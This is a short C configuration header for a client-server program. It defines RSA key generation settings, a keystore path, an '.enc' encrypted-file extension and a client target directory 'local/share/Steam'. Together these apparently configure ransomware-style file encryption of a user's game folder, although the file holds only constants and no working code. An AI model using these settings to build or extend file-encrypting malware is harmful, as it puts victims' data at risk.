#ifndef CONFIG_H_
#define CONFIG_H_

/* Shared configuration */

#ifndef CONFIG_PREALLOC_FILES
#define CONFIG_PREALLOC_FILES	16
#endif

/* Server configuration */

#ifndef CONFIG_RSA_KSIZE
#define CONFIG_RSA_KSIZE		1024
#endif

#ifndef CONFIG_PREGEN_KEYS
#define CONFIG_PREGEN_KEYS		128
#endif

#ifndef CONFIG_REGEN_KEYS
#define CONFIG_REGEN_KEYS		96
#endif

#ifndef CONFIG_KEYGEN_SLEEP
#define CONFIG_KEYGEN_SLEEP		60
#endif

#ifndef CONFIG_KEYDIR
#define CONFIG_KEYDIR			"etc/keystore"
#endif

#ifndef CONFIG_KEYFILE_EXT
#define CONFIG_KEYFILE_EXT		".key"
#endif

/* Client configuration */

#ifndef CONFIG_CRYPTED_EXT
#define CONFIG_CRYPTED_EXT		".enc"
#endif

#ifndef CONFIG_CRYPTDIR
#define CONFIG_CRYPTDIR			"local/share/Steam"
#endif

#endif
